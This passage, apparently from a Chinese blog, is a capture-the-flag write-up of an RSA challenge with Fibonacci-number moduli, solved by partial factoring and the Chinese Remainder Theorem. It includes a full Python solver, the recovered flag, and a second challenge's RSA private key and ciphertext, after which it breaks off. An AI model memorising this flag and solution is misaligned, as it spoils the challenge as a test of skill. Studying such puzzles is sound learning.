class="string">c = 5527295227051355798054266434992298352109856653351231751774366060474987674395801103779017995136358984850596693033786379284945829600181195650018576473832122123689374306357799469703873467631828582340852591088516097040696492555053370228278729688979599727840615379716837557947979105109295383721874687464666950312431293310758869315198932080703658526964530199675712576963592684818247111162090363056774275409164410925950049724140156220797817319956734605599349828169364123443161210061751433895202659075589086208524908238147473041649043519688635549021052796213275288198028578858764052136199721656697612607002863436475864686744976361468007786764828741313027638038039869019572535344397813504142312113571484580538973034322648843004665888312135523153988203801290669186909018156540165112741651436700837185946879899717245458101182522362705139925914797396797181901663790903646171709744845258954151859189108531243389446981087547490853432279034430995853488274409450850672046</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>有意识去查论文，没能力去读论文</p>
<h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><h4 id="漫漫求学路"><a href="#漫漫求学路" class="headerlink" title="漫漫求学路"></a>漫漫求学路</h4><p>看了题目，发现是将Fibonacci数列中的三个数作为模数了，第一时间想到的就是典型论文题，于是我直接baidu，发现了题目的出处</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-1fcd93e4.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-1fcd93e4.png" width="" height="" >

<p>摘要里说，这样子RSA加密是很容易被攻击的，所以再次坚信我找对了</p>
<p>但是这篇论文要收费，屑</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-cc50866c.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-cc50866c.png" width="" height="" >

<p>但是没有困难的狗狗，只有勇敢的问题，我们去找了老师，毕竟是研究RSA的，必定听过这类的攻击，或者说有相应的文献</p>
<p>果不其然，入场券到手</p>
<h4 id="漫漫求学路2"><a href="#漫漫求学路2" class="headerlink" title="漫漫求学路2"></a>漫漫求学路2</h4><p>论文并不长</p>
<p>第一点是说，如果用来作为模数n的斐波那契数在斐波那契序列中是排偶数位，那么这个n就可以分解成一个斐波那契数和一个卢卡斯数</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-07048377.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-07048377.png" width="" height="" >

<p>但这不是我们所需要的，因为题目里的n都是奇数</p>
<p>唯一找到有用一点的信息就是，</p>
<p>第$r$位置的斐波那契数$U_r$和第$s$位置的斐波那契数$U_s$，如果$r$整除$s$，则$U_r$整除$U_s$</p>
<p>题目所给的数据也确实能$P_i$被整除，但若是要完全分解，木大木大</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-95dc5fb2.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-95dc5fb2.png" width="" height="" >

<p>这里还说上面那个是充要条件</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-103c3baf.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-103c3baf.png" width="" height="" >

<img alt="20210529 DASCTFXBUUOJ五月大联动-4e045ef8.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-4e045ef8.png" width="" height="" >

<hr>
<p>麻了，看个der论文，网上找了（算法没学好，拼不过acm的）一个脚本，算出了第13000斐波那契数，都已经是小三千位的了，而我们题目给的数据才一千位都不到。吼吼吼吼，这题别（jiù）有（shì）洞（tào）天（lù）</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-f5e65eda.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-f5e65eda.png" width="" height="" >

<h4 id="我要这题何用"><a href="#我要这题何用" class="headerlink" title="我要这题何用"></a>我要这题何用</h4><img alt="20210529 DASCTFXBUUOJ五月大联动-f4679c38.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-f4679c38.png" width="" height="" >

<p>经过验证，这三个数根本不是斐波那契数，屑，出题人使诈</p>
<p>……</p>
<p>拖拖拖，拖到比赛结束又过去了一个白天，半夜看到别人队伍的wp了，师傅们TQL___Orz，都给A穿了</p>
<p>但其实我们已经出来了，害，<strong>意识</strong>不够，看到给了三组没有想到什么</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-083610fe.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-083610fe.png" width="" height="" >

<p>简单的推理如下，</p>
<p>已知（注意这里的$F(q_i)$并不是完全分解）<br>$$<br>\begin{cases}<br>  c_1=\ m^e\ mod\ F(p_1)\times F(q_1)\\<br>  c_2=\ m^e\ mod\ F(p_2)\times F(q_2)\\<br>  c_3=\ m^e\ mod\ F(p_3)\times F(q_3)<br>\end{cases}<br>$$<br>由同余的性质可知，在模$F(p_i)$的情况下也是成立的（吼吼吼，这可是对一个密码学菜鸡（wǒ）很重要的数论性质，在文末强调一下吧，<a href="#%E4%B8%80%E4%B8%AA%E5%BE%88%E9%87%8D%E8%A6%81%E7%9A%84%E6%80%A7%E8%B4%A8%E4%BB%A5%E5%8F%8A%E7%AE%80%E6%98%93%E8%AF%81%E6%98%8E">传送门</a>）<br>$$<br>\begin{cases}<br>  c_1=\ m^e\ mod\ F(p_1)\\<br>  c_2=\ m^e\ mod\ F(p_2)\\<br>  c_3=\ m^e\ mod\ F(p_3)<br>\end{cases}<br>$$<br>这时的解密就是，为了避免混淆，我这里完全分成三个加密了，它们都是类似的，举第一个为例<br>$$<br>m_1=\ c_1^{d_1}\ mod\ F(p_1)<br>$$<br>而$m_1$都满足<br>$$<br>m\equiv\ m_1\ mod\ F(p_1)<br>$$<br>但是因为$m_1$求出来太小啦（毕竟是在模$F(p_1)$下，原来可是在模$F(p_1)\times F(q_1)$下的），如果m比任意的$F(p_i)$都大，那么求出来的$m_i$都只不过是m在模各自$F(p_i)$的一个剩余类罢了，这样解出来的$m_i$就是不对的</p>
<p>那应该怎么办呢？</p>
<h4 id="中国剩余定理yyds"><a href="#中国剩余定理yyds" class="headerlink" title="中国剩余定理yyds"></a>中国剩余定理yyds</h4><p>这就要引入中国剩余定理CRT这个概念了，它的原本是用来解同余方程的，但是求出来的解是在模所有模数之积的情况下的，所以假设所有模数之积为N，只要明文m是在$\mathbb{Z_N}$中的，就可以做到——完全求解；但是如果不成立只能求出一个与m在模N同余的剩余类，并不是真的解</p>
<p>这就是我们的思路，因为我们手头上就只有三组解，可能将模数给扩大到$F(p_1)\times F(p_2)\times F(p_3)$，如果凑巧，m比这个乘积要小，就能求出来了，如果还不行，说明题目给的m比较大，也就是flag比较长，只能继续分解$F(N_i)$，构造更多同余方程，直到模数之积大于flag转变成的m</p>
<p>也就是用这个<br>$$<br>\begin{cases}<br>m_1=\ c_1^{d_1}\ mod\ F(p_1)\\<br>m_2=\ c_2^{d_2}\ mod\ F(p_2)\\<br>m_3=\ c_3^{d_3}\ mod\ F(p_3)<br>\end{cases}<br>$$<br>推导出的<br>$$<br>\begin{cases}<br>m\equiv\ m_1\ mod\ F(p_1)\\<br>m\equiv\ m_2\ mod\ F(p_2)\\<br>m\equiv\ m_3\ mod\ F(p_3)<br>\end{cases}<br>$$<br>解同余方程，看看出来的是不是flag</p>
<p>醒悟之后下来含泪的脚本，包括抄来的求fibonacci数列的和中国剩余定理的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span> <span class="keyword">or</span> n == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fibonacci(n - <span class="number">1</span>) + fibonacci(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci_2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    t = <span class="built_in">int</span>(math.log2(n)) - <span class="number">1</span></span><br><span class="line">    x, y, = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> t &gt; <span class="number">0</span>:</span><br><span class="line">        last_x = x</span><br><span class="line">        <span class="keyword">if</span> (n &gt;&gt; t) &amp; <span class="number">0x1</span>:</span><br><span class="line">            x = x**<span class="number">2</span> + (x + y)**<span class="number">2</span></span><br><span class="line">            y = last_x * (last_x + <span class="number">2</span> * y)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x = x * (x + <span class="number">2</span> * y)</span><br><span class="line">            y = last_x**<span class="number">2</span> + y**<span class="number">2</span></span><br><span class="line">        t -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n &amp; <span class="number">0x1</span>:</span><br><span class="line">        <span class="keyword">return</span> x**<span class="number">2</span> + (x + y)**<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x * (x + <span class="number">2</span> * y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crt</span>(<span class="params">ci, ni</span>):</span></span><br><span class="line">    <span class="comment"># 检查是否有解，有解的条件，ni都互质</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ni)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(ni)):</span><br><span class="line">            <span class="keyword">assert</span> gcd(ni[i], ni[j]) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ci) == <span class="built_in">len</span>(ni)</span><br><span class="line"></span><br><span class="line">    _N = reduce(<span class="keyword">lambda</span> a, b: a*b, ni)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(ci, ni):</span><br><span class="line">        _Ni = _N//j</span><br><span class="line">        _Ni1 = invert(_Ni, j)</span><br><span class="line">        x += i*_Ni*_Ni1</span><br><span class="line">    <span class="keyword">return</span> x % _N</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">30039002188673063651200304724856649750424855614713561659816258454033925531379709006718595334296516241593158998074215212142272196270365664747873959581114872378007750905526355257967620809790424857457592189785708634246739647422565451143815984036502331156971328504879840492056807034649796388685443055568787638373563</span></span><br><span class="line">F1 = <span class="number">36700337315478358423302463804643502364132894595387679831392170242048570294154137205916046749632259595443511772051005890145681246611711817441148722686433058905309178967626876196428817911402628279151882749816176290631663850711266005570519120688501046610172118214633159846090742563888545000820131558915392759986137704413717356161549696109102298045171982651759736931461029700093546074544216714411268154766313965335118439291477901688458760307733751977411099481922798986947005456033024215394531788003343093192780270571980899284495530589488614458267489897774350955741276841747926401364869628844871476483816139224540693572750083532852690939679488779770278121521966166639184387859708670915429469804929002101080867694318638835470062005769336931710061708165085286293560882862673863182161513175108975599928164057840378446866053785509135134250439675861761412916432659950998041079347609299108756058982586701419597870024243472621875398244582253182771532237956030075796524234449649579003219049</span></span><br><span class="line">c1 = <span class="number">5149579488901718498256373861975221458889060262051324713153792274531569740959338672159468511041469512968513162060650323314015111729630790249929764405001469068728832250672432536655958494683225528045534739312500520653653926107616626321646038503307002215682827882897681738805565989931916973526625237494508575698650414426281874530049741540818321302625573676530536769431267223818807952634410781018835593002628264062168865877875709419051886274533984009771861504132373726000546543208681246415153517353772565209140561174813777886487077708362479762600413004602240042298109893816953817393105259401510845057279294044756541864350957113952935658077279981571022227194710269040317178329523984989277421087981594122731035549685470894608888049815174440061043045638797036874542111575347820490125255592416295645107767029867230219384632544284156692872055786752135888144873738488840255388898851551453544530082551649823629868841430161794325580654855230486824210856918330348898081161664747016870749921</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">20756277616755836861796337131683494338352701206928094011019872107808330954223862907177555525893261715593610455375647872190101833907080699823790147515155417500649420182409578349022597139001229776650770207829659368291648098353474620323733162983388953788239424626462428488411835382477744747369092196172727799468129</span></span><br><span class="line">F2 = <span class="number">73745878045934636387896195274069826551569516766963182339313590908194755029865664679120132471843611642027469204171633501721641080925317635658799561477123939207311526297390646712571316606381873782191178958234889168599083479590822672109275622907151415552207811665808203751267410151224170154736841450903230193274146578562848780223022725054392389915985290416059522271191922854734627854849084277940339695243325424932830011581455271309868481867791848671985869262214017536640985196012788793460756899871516178490553441223897250090614367273308559864669269965578509523152119870676641602044879271520652270508502838994825168113044092631541016378753797168654004397854528716878554680966919397339024634461107466963998140873416841269245629405227723896214356538994142798927935847118081299628628813983021407779086407107873835131175157418129203731497042769363491200520978441329400751265966093987214492433690588592278950077342020700742819163199408329926294779182691364743193734488228719</span></span><br><span class="line">c2 = <span class="number">5893676968379648852677257584942191109596695953257511502221493623707657958793151928063695511404323761502093871747314475680963368412056002167272056988434183588136518540030328900237814175026374170035752147457944130025788557913749495512316872731640598728203711834687604349623497761823630666336599012384701148134898626277451946739191645056229526840490101366707716010899628734677395956010814780086058428182227433879240458756480238286363782312887091585752283137070930652073681891561066188131229432708558323016170835880200185835314330898745048592325798107333894598294876001536344275083054913481975007098183772410065580414486344966276992142840553960291265334551415769700709112077959058690472699228393932778693676888105307493544864165340738016954896582284163878309410561472175085522432252484026380738098291004277354471010420592137620174716251226560188793137038378169674648650109100511358090004029326014324282641470675210622193652390362972072927753788251933923336522541020538</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">23691611795512881548876576490920777356012500842496810447368465555253207159934330531730113872431842020621324344446142448954349963332039143377219840904377051014940314330764948944111930704132580375788932310940376348012980840541573284360163056070088226098587825855247120630453584914813593602869923553994121677913829</span></span><br><span class="line">F3 = <span class="number">9354120234373821188002721174172376187851074553842250946994966454521076364770447254561289329644492544492363073660918209867635665556179493971516453831575577085229601305613934033279832212516762995062790158649731235328923025944567754094837437882988453755837757140503680845082446605924488438186342529892438539978025244619294478667640323307281530468578326413724432442367286795555698768396763148070646067431485983937912884160277380848384622618517411849896779104223556934427313741222400162647303864273804545658096365574243669367638797710979775090679277794669009497301787205587916669811596486681600927221914751277959719025890975947906807551671033707046998050580404291266129815613731776357171701993365320613177014644670728884401252046842886254766791009584832861321307145962353061550438485818190867215102212015602783104130507243211654301408379888922865198634687009616395466846020452426608653076648665616711357303753242673389482755201639605067581161306428053985480749</span></span><br><span class="line">c3 = <span class="number">5527295227051355798054266434992298352109856653351231751774366060474987674395801103779017995136358984850596693033786379284945829600181195650018576473832122123689374306357799469703873467631828582340852591088516097040696492555053370228278729688979599727840615379716837557947979105109295383721874687464666950312431293310758869315198932080703658526964530199675712576963592684818247111162090363056774275409164410925950049724140156220797817319956734605599349828169364123443161210061751433895202659075589086208524908238147473041649043519688635549021052796213275288198028578858764052136199721656697612607002863436475864686744976361468007786764828741313027638038039869019572535344397813504142312113571484580538973034322648843004665888312135523153988203801290669186909018156540165112741651436700837185946879899717245458101182522362705139925914797396797181901663790903646171709744845258954151859189108531243389446981087547490853432279034430995853488274409450850672046</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="number">251</span></span><br><span class="line">q1 = <span class="number">119677299556466389048606791732496612551493448664197456812016965952326396539361390465014324041021977058140075689538706024471203969204644082660852428610019411864572712771021335689114027130639142858396781632612384996998962738735320522485322645563754307398292145437768288812975326831274089197949972332943377045313</span></span><br><span class="line">p2 = <span class="number">197</span></span><br><span class="line">q2 = <span class="number">105361815313481405389829122495855301209912188867655299548324223897504218041745496990749012821793206678140154595815471432437065146736450252912640342716524961932230559301571463700622320502544313587059747247866291209602274610931343250374280015144106364407306723992195068469095611078567232220147676122704202027757</span></span><br><span class="line">p3 = <span class="number">149</span></span><br><span class="line">q3 = <span class="number">159004106010153567442124674435709915141023495587226915754150775538612128590163292159262509210951959869941774123799613751371476263973417069645770744324678194731143049199764758014174031571359599837509612825103196966530072755312572378256127893087840443614683395001658527721164999428279151697113580899289407234321</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p1*q1 == n1</span><br><span class="line"><span class="keyword">assert</span> p2*q2 == n2</span><br><span class="line"><span class="keyword">assert</span> p3*q3 == n3</span><br><span class="line"></span><br><span class="line">p = [fibonacci_2(p1), fibonacci_2(p2), fibonacci_2(p3)]</span><br><span class="line">f = [F1, F2, F3]</span><br><span class="line"></span><br><span class="line">p11 = <span class="number">582416774750273</span></span><br><span class="line">q11 = <span class="number">21937080329465122026187124199656961913</span></span><br><span class="line"></span><br><span class="line">p22 = <span class="number">15761</span></span><br><span class="line">q22 = <span class="number">25795969</span></span><br><span class="line">r22 = <span class="number">227150265697</span></span><br><span class="line">s22 = <span class="number">717185107125886549</span></span><br><span class="line"></span><br><span class="line">p33 = <span class="number">110557</span></span><br><span class="line">q33 = <span class="number">162709</span></span><br><span class="line">r33 = <span class="number">4000949</span></span><br><span class="line">s33 = <span class="number">85607646594577</span></span><br><span class="line"></span><br><span class="line">phi1 = (p11-<span class="number">1</span>)*(q11-<span class="number">1</span>)</span><br><span class="line">phi2 = (p22-<span class="number">1</span>)*(q22-<span class="number">1</span>)*(r22-<span class="number">1</span>)*(s22-<span class="number">1</span>)</span><br><span class="line">phi3 = (p33-<span class="number">1</span>)*(q33-<span class="number">1</span>)*(r33-<span class="number">1</span>)*(s33-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d1 = invert(e, phi1)</span><br><span class="line">d2 = invert(e, phi2)</span><br><span class="line">d3 = invert(e, phi3)</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, d1, p[<span class="number">0</span>])</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, p[<span class="number">1</span>])</span><br><span class="line">m3 = <span class="built_in">pow</span>(c3, d3, p[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(crt([m1, m2, m3], p)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;40491b82090cc75e56ce5196dc1b91e8&#125;</span><br></pre></td></tr></table></figure>

<p>顺便也学到了，库函数里有直接求欧拉函数的，好耶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 现成的欧拉函数</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = …</span><br><span class="line">phi = euler_phi(n)</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><a href="https://zhuanlan.zhihu.com/p/376338394">贴上大佬的链接</a></p>
<p>可恶啊，差一点，托论文的福气，我们知道了那个斐波那契数列的性质，但是还是意识太差了，中国剩余定理解同余方程啊</p>
<p>好题，确实没毛病，要怪只怪我太抠细节了吧</p>
<h3 id="一个很重要的性质以及简易证明"><a href="#一个很重要的性质以及简易证明" class="headerlink" title="一个很重要的性质以及简易证明"></a>一个很重要的性质以及简易证明</h3><p>这条性质如下<br>$$<br>a\equiv b\ (mod\ m),a\equiv b\ (mod\ n)\Leftrightarrow\ a\equiv b\ (mod\ mn)<br>$$<br>前提是$(m, n)=1$，也就是m和n互素</p>
<p>证明：<br>$$<br>\because a\equiv b\ (mod\ m),\ a\equiv b\ (mod\ n)<br>$$</p>
<p>$$<br>\therefore m|(a-b)且n|(a-b)<br>$$</p>
<p>由FTA（算数基本定理）可知，m可以唯一分解成<br>$$<br>m=m_1\times m_2\times\ …\times m_i\<br>$$<br>同理，<br>$$<br>n=n_1\times n_2\times\ …\times n_i<br>$$</p>
<p>而且$(m,n)=1$，也就是说集合${m_1,\ m_2,\ …,\ m_i}$和集合${n_1,\ n_2,\ …,\ n_i}$中的元素，两两不相同<br>$$<br>\therefore mn|(a-b)即a\equiv b\ (mod\ mn)<br>$$</p>
<p>这里还用到了同余关系的等价表达式，望周之</p>
<h3 id="举一反三"><a href="#举一反三" class="headerlink" title="举一反三"></a>举一反三</h3><p>在彻底弄懂这道题时，我发现其实不需要三组，两组也行，不过必须是$F(p_i)$想乘大于m的情况，因为中国剩余定理的一种用法，我的理解是扩大模数，只能求出$m\ mod\ F(p_1)F(p_2)F(p_3)$是吧，但如果m本身就比$F(p_1)F(p_2)$小，当然可以只用CRT求解前面两个组成的同余方程；这就和模数不够再分解构造反过来了</p>
<p>据结果返回，我们发现，</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-e580ce12.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-e580ce12.png" width="" height="" >

<p>直接开冲</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-cce1f4d0.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-cce1f4d0.png" width="" height="" >

<p>Capture The Flag</p>
<h2 id="还有一个小插曲"><a href="#还有一个小插曲" class="headerlink" title="还有一个小插曲"></a>还有一个小插曲</h2><p>彭总给的一道misc，最后一步是rsa</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAmN9l2LF50PqlGXwwk4AinAKHLyd5dpDVr9G7LqD2pi492zzI</span><br><span class="line">A9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1mABAdppeTQyYyE9+KmnAjg1WuI/H</span><br><span class="line">DtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMTDicdJ3UJ3NNkP3asIxFWRXNmQ2td</span><br><span class="line">INtmViJufotE7lj9gCDRleZsm0Io8t12b90hTgd+aqKCRumIgdnOm6VW4dsHzCly</span><br><span class="line">AYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCbhdO7p3ZdizcDgazDC1/G4lwmvWC7</span><br><span class="line">v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOIpQIDAQABAoIBABjaCFaH04PTm09f</span><br><span class="line">Tw5LgFTYXF2gDzDlLrfcYo+b/zzYu5mOcf2eCVrFkyk39yJmfMQO12kqNySBsL/5</span><br><span class="line">ysEA7jz9nX0qbzYbXCMEOUBv3Ku7I2Pxi6yvS5zWQnHCorGobKnYsJ7bFtuBMMK2</span><br><span class="line">YL+z498jIKwvbKEHhH6ErkstIFc9wQnl635zYLE3EywbD4ktyDholdfBFyTCwk1J</span><br><span class="line">Gd/holAwGN78PldVc+K73m8E2Jo3VnN7TGOG7Fb5CS19xj7zcIE4cubhEH+w6RMU</span><br><span class="line">Ra592NjSd2iZEW5xjugIbTThmLbFOXaBioeXVWstW9VRzgTIfb3TlcssLtzZoAje</span><br><span class="line">0c9wrgECgYEAxvwc9hlEY8VABtoVrxxY7NtqRUh3B8jeKW4eCP8Ri0DiH9eYHL9R</span><br><span class="line">pJSBP///vWcOt4EBfvb1krp7HJgh/5bJlewuuEtR4WbFfqgfwLPbKjKE0D6TVQyk</span><br><span class="line">AH4egcplynKqSdDwQvlghpqya69YmTx+S7qawr3aTUJ2Zvl/ldzrKEECgYEAxKzg</span><br><span class="line">OOLOJu5QHB3MPaE9HKcxU+xir2j0rCNyUOtN9dVXg/wdWOabatGfdhPa2xmgzlPc</span><br><span class="line">QzqLW5ZnIITjXYZIx7uctP2i5dhDm7NycthrTzykT7owHbMHX6Ey6qvup4K6EzwL</span><br><span class="line">uCKD7XoAz7ImfQvv6e2BYYhIqUfvQFAuitj652UCgYAUlSF9x1FOrKmZy9cwXNNJ</span><br><span class="line">9MxCTGObl4h7apuKvK+Y4uZA+vEOEDAmwQG5mAZhFhbsnliERJFUUxvG8mmZ4YQK</span><br><span class="line">kPqoL4pRsWq+Vi+qpDAIZl9clwxwYLVaI7GOJVxwG3pH1mfz1Y3Jfpj0EJguiZZa</span><br><span class="line">yPuXJ0I8eaJ7tlUfMFHWwQKBgEIHD9fJPRCQ3VAzKMhgA1ZFQyg7qf3drJbF57EG</span><br><span class="line">7ktj7lefInMgKHk6GuDXVZhNCFF8kev4EaUT31dphbN2S6TSdY/FvxSPAFObcQbh</span><br><span class="line">ZVVatIcXqOOvoQAX7DIguqR+HN4sQHr3C3eEiBUyZ/1/LnJIjDEkQdCjF81tndJ7</span><br><span class="line">efCJAoGBAJ3sgwKQUSdKhiduyok/qJ0Ye5EgJGuskUIsLeLVnShzYrAAUVJMIpLK</span><br><span class="line">OLXC8ygMyAp9gpusnS5obQjUKaB7livuqQ3OKEUvm9tyJbjMLfJoMGry7wjj0eiI</span><br><span class="line">F3OCoV5LfjIfAldn/k2KGGR6/LM1K2vi/wCo1wuHHwpWbndJwqF3</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmN9l2LF50PqlGXwwk4Ai</span><br><span class="line">nAKHLyd5dpDVr9G7LqD2pi492zzIA9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1</span><br><span class="line">mABAdppeTQyYyE9+KmnAjg1WuI/HDtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMT</span><br><span class="line">DicdJ3UJ3NNkP3asIxFWRXNmQ2tdINtmViJufotE7lj9gCDRleZsm0Io8t12b90h</span><br><span class="line">Tgd+aqKCRumIgdnOm6VW4dsHzClyAYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCb</span><br><span class="line">hdO7p3ZdizcDgazDC1/G4lwmvWC7v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOI</span><br><span class="line">pQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;data&gt;</span><br><span class="line">6945004599188163993695415369835695903301224003136994252560594956191090963121611565339316899123749651980866032846579298200421747380583546633355992903073674181349057044030322829788264132202636849376954935277228938532451604402772829242424577058024238656161078439246537271516326863255516855631753446705292842229626286876548916801469642547513456705866784202623394305276451128865785358297012288872815722144655832856702699498675579782594166664458814522864775862036884859354259378908758433643337060342583622920263235497780709801069090899910257671959718315799533292405361650450010152269010240983236777594133358567962307235569</span><br><span class="line">&lt;sign&gt;</span><br><span class="line">2657375403899004421682435875591648757169751001935445937761677813563331237751296771655965799410203548200444843121899114276425174188686046977514392352233441829494629361400810323413751538449142557000621910082199277027187814332458889139635831754705831808451385798544850324418189973193940364270700678684371080465070928269782397410454121628205746311654719735981174781630012234885865191874665887323338400055601894791632973447395440378983992188376105785566869556895986983889219094640854379267584790389009829385657891279182819588524435817909919666674804622368593843455996806164859962400637898116212711639490474051288221345806</span><br></pre></td></tr></table></figure>

<p>这个网站可以对这个文件的格式进行解析（虽然觉得用openssl更有逼格一点，但是搜了许多感觉有点怪，在线的不香吗）<br><a href="https://www.ssleye.com/priv_get.html">https://www.ssleye.com/priv_get.html</a></p>
<p>解析出来是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">19298383934402303776125763032487034395837290787269136241860929371666322803767005809256376467251747337544207987651243732876788723589391443122139006291670739679671881793995062117862054219773720641070620393257280059636631655606299095240092759065646066472874883103079707806412908225076882298697592818427957280248310545565886424283345305315588905456274845835539850117078894827271423187201674309901517200507605514506810554986443591457553871395991374493663775609810305552059745143075621932565847065010052223136631616841830344641425039696588885154977303322142305642341212151656150304867047412766712682132001889777020524791973</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="number">3137235186797109181543919913150081090883783146124561354971792140710331616511797608859383781407450999194287072957815443643580070206469268276290781894677206166703148277053014202720636062948704086393432559771778716684753248681348101998686974611065401104750125952976352395891223648167738895743231363772089916593108326960368256904683762740112717950191378373879647606045501882017215733660352686694405659463412799487222511524326086693134712754258387193963090680988416969472940644308784344753494344590799813350562816191244386991480741139476116903925249873160845868063446516486452687657008647635622012862948358441702637219329</span></span><br><span class="line">p = <span class="number">139731890355244444444481193351254240382046157745753107784168081259905132570466329632284952677745944718796408024129423905064872080575084258263419439079106234950631002219878620094334031716695105950708580750238041143435139361782342237330225211801270672585910851695391826655791509425136418067722676156822188664897</span></span><br><span class="line">q = <span class="number">138110089868099985112598225976416346201381948401336998275010504058986842232246648573037043751233266052881639193423727942204630085471488139402695765255520423890781964577838337616082316055958265340997629227918247719815192989410797326080614722191761865261768884814085886604594016717232369095342986175683061540709</span></span><br></pre></td></tr></table></figure>

<p>然后猜测data就是密文，然后常规解密只出来一半，另一半应该是与sign有关</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-faa58622.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-faa58622.png" width="" height="" >

<p>看了套神的博客</p>
